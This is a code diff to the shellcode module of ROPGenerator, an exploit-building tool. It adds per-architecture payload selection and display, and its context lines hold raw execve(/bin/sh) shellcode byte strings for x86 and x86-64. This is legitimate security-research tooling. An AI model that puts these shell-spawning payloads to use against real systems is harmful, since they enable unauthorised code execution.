@@ -1,11 +1,17 @@
 # ROPGenerator - Shellcode module 
 # Managing shellcodes 
 import ropgenerator.Analysis as Analysis
-from ropgenerator.Colors import string_special, string_bold
+from ropgenerator.Colors import string_special, string_bold, ROPGENERATOR_COLOR_ANSI, END_COLOR_ANSI, string_payload
 from ropgenerator.Config import ROPGENERATOR_DIRECTORY, ARCH
+import ropgenerator.Database as Database
 
+################
+# Global data ##
+################
 
 # List of shellcodes 
+selected_shellcode = dict()
+
 # A shellcode is stored as a pair (shellcode, description)
 native_shellcodes = dict()
 custom_shellcodes = dict()
@@ -25,7 +31,8 @@ def read_shellcodes(filename):
         res = []
     return res
 
-# X86 shellcodes 
+# X86 shellcodes
+selected_shellcode['X86'] = 0
 native_shellcodes['X86'] = [
 ("\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\
 \xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68", "LINUX - Obfuscated execve(/bin/sh) - by Russell Willis"),
@@ -50,6 +57,7 @@ native_shellcodes['X86'] = [
 ]
 custom_shellcodes['X86'] = read_shellcodes(ROPGENERATOR_DIRECTORY+'shellcodes_X86.custom')
 # X86-64 shellcodes 
+selected_shellcode['X86-64'] = 0
 native_shellcodes['X86-64'] = [
 ('1\xc0H\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xffH\xf7\xdbST_\x99RWT^\xb0;\x0f\x05',
     'LINUX - Execute /bin/sh - by Dad`'), 
@@ -67,6 +75,10 @@ native_shellcodes['X86-64'] = [
 ]
 custom_shellcodes['X86-64'] = read_shellcodes(ROPGENERATOR_DIRECTORY+'shellcodes_X86-64.custom')
 
+#############
+# FUNCTIONS #
+#############
+# Save shellcodes in a file
 def write_shellcodes(filename, data):
     try:
         f = open(filename, 'w')
@@ -75,26 +87,71 @@ def write_shellcodes(filename, data):
         f.close()
     except:
         return
-        
+
+# Save all shellcodes
 def save_shellcodes():
     write_shellcodes(ROPGENERATOR_DIRECTORY+'shellcodes_X86.custom', custom_shellcodes['X86'])
     write_shellcodes(ROPGENERATOR_DIRECTORY+'shellcodes_X86-64.custom', custom_shellcodes['X86-64'])
 
-def show_shellcodes(arch):
-    def short_shellcode(raw):
+
+def short_shellcode(raw):
         res =  "'\\x" + "\\x".join(["%02x"%ord(c) for c in raw]) + "'"
         if( len(res) > 50 ):
             res = res[:46] + "...'"
         return res
+
+def pack_shellcode(raw):
+        tmp = "\\x" + "\\x".join(["%02x"%ord(c) for c in raw])
+        res = '\t'+tmp[:52]
+        tmp = tmp[52:]
+        while( tmp ):
+            res += '\n\t'+tmp[:52]
+            tmp = tmp[52:]
+        return res
+
+def selected(arch):
+    number = selected_shellcode[arch]
+    if( number == 0 ):
+        return (None, None)
+    else:
+        if( number > len(custom_shellcodes[arch])):
+            return native_shellcodes[arch][number-len(custom_shellcodes[arch])-1]
+        else:
+            return custom_shellcodes[arch][number-1]
+
+def show_selected():
+    if( not Database.gadgetDB ):
+        print(string_bold("\n\tOops! You should load a binary before selecting a payload"))
+        return
+    else:
+        arch = Analysis.ArchInfo.currentArch
     
+    if( selected_shellcode[arch] == 0 ):
+        print(string_bold("\n\tNo payload selected for architecture ") + string_special(arch))
+        return
+    
+    print(string_bold('\n\t-------------------------------'))
+    print(string_bold("\tSelected payload - arch " + string_special(arch)))
+    print(string_bold('\t-------------------------------'))
+    (shellcode, info) = selected(arch)
+    print("\n\t{}\n\n{} - {} bytes".format( info, \
+            string_special(pack_shellcode(shellcode)), str(len(shellcode))))
+    
+# Print all shellcodes for an arch
+def show_shellcodes(arch):
     global native_shellcodes
     global custom_shellcodes
+    global selected_shellcode
     
     if( arch not in Analysis.supportedArchs ):
         print("Error. Architecture {} is not supported".format(arch))
         
     print(string_bold('\n\t------------------------------------'))
     print(string_bold("\tAvailable payloads for arch " + string_special(arch)))
+    if( selected_shellcode[arch] == 0 ):
+        print(string_special("\t(No payload selected yet)"))
+    else:
+        print("\t(Currently selected: {})".format(string_payload(str(selected_shellcode[arch]))))
     print(string_bold('\t------------------------------------'))
     
     if( (not native_shellcodes[arch])and(not custom_shellcodes[arch])):
@@ -102,9 +159,30 @@ def show_shellcodes(arch):
     i = 0
     for shellcode in custom_shellcodes[arch] + native_shellcodes[arch] :
         i = i + 1
-        print("\n\t({}) {}\n\t{} - {} bytes".format(string_bold(str(i)), shellcode[1], \
-            string_special(short_shellcode(shellcode[0])), str(len(shellcode[1]))))
-    
+        if( i == selected_shellcode[arch] ):
+            number = "("+ROPGENERATOR_COLOR_ANSI+"*"+END_COLOR_ANSI+")"
+        else:
+            number = "({})".format(string_bold(str(i)))
+        print("\n\t{} {}\n\t{} - {} bytes".format(number, shellcode[1], \
+            string_special(short_shellcode(shellcode[0])), str(len(shellcode[0]))))
+
+# Add a shellcode to an arch
 def add_shellcode(arch, shellcode, description):
     global custom_shellcodes
+    global selected_shellcode
+    # If the selected shellcode was a native its number increases 
+    if( selected_shellcode[arch] > len(custom_shellcodes[arch])):
+        selected_shellcode[arch] = selected_shellcode[arch] + 1
+    # Add the shellcode 
     custom_shellcodes[arch].append((shellcode, description))
+
+# Select a shellcode for an arch 
+def select_shellcode(arch, number):
+    # Check if custom shellcode or natve shellcode
+    # Custom ones always come first 
+    global selected_shellcode
+    if( number < 1 or number > len(custom_shellcodes[arch]) + len(native_shellcodes[arch])):
+        return False
+    selected_shellcode[arch] = number
+    return True
+    
